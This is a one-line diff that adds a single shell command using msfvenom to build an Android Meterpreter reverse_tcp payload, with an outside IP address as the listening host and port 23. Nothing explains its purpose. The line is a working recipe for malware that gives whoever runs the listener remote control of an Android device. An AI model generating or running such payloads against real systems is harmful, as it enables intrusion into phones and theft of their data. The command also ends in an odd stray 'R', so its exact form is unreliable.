@@ -1,0 +1,1 @@
+msfvenom LHOST=123.123.45.3 LPORT=23 -p android/meterpreter/reverse_tcp R
